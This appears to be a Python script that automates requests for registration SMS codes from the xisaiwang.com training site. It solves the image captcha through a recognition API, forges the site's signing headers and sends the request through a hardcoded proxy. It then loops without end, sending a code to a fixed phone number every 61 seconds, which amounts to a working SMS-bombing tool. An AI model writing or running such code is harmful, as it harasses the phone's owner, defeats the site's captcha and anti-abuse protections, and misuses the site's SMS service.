import time

import requests
import sys
sys.path.append(r'../')
import tools


def xisai(phoneNum):
    result = tools.randomNum()
    url = 'https://base.xisaiwang.cn/verify/code/r/image.do?key='+result
    headers ={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53'}
    r = requests.get(url, headers=headers).content
    with open('yzm.jpg',mode='wb') as f:
        f.write(r)

    code = tools.base64_api('yzm.jpg')
    print("希赛识别的验证码为：",code)


    url2 = 'https://wangxiao.xisaiwang.com/ucenterapi/reg/sms/send.do'
    pkey = tools.randomNum2()


    data2={"phone": phoneNum,
    "imgCode": code,
    "imgKey": result,
    "pkey": pkey,
    "sk": "phone"}

    sscc2 ='imgCode='+code+'&imgKey='+result+'&phone='+phoneNum+'&pkey='+pkey+'&sk=phone'
    sid = tools.randomNumchart()
    #print("希赛随机的sid：", sid)
    headers2 ={
       'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'clientType':'PC',
        'Connection':'keep-alive',
        'Content-Length':'69',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
      #  'Cookie':'mddsync=1; mddcid=1575364957564829696; Hm_lvt_4b9f46d3a269fb3925580a1827143bfb=1664431252,1664433053; _sid_=eab792fe9dd3404418daf3fbb2c2c944; mddldyurl=https://wangxiao.xisaiwang.com/ucenter2/register.html; ldyc=https%3A%2F%2Fwangxiao.xisaiwang.com%2Fucenter2%2Fregister.html; Hm_lpvt_4b9f46d3a269fb3925580a1827143bfb=1664433053',
        'Host':'wangxiao.xisaiwang.com',
        'Origin':'https://wangxiao.xisaiwang.com',
        'Referer':'https://wangxiao.xisaiwang.com/ucenter2/register.html',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'sid':sid,
        'sscc':tools.toolmd5(sid+phoneNum),
        'sscc2':sscc2[::3],
        'TE':'trailers',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'}

    r = requests.post(url2, headers=headers2,data=data2,proxies= {'http': '111.224.213.31:23158', 'https': '111.224.213.31:23158'})
    print('希赛结束：',phoneNum,r.text)
    print("\n")
while 1:
    xisai('17882700883')
    time.sleep(61)
# xisai('18728773736')
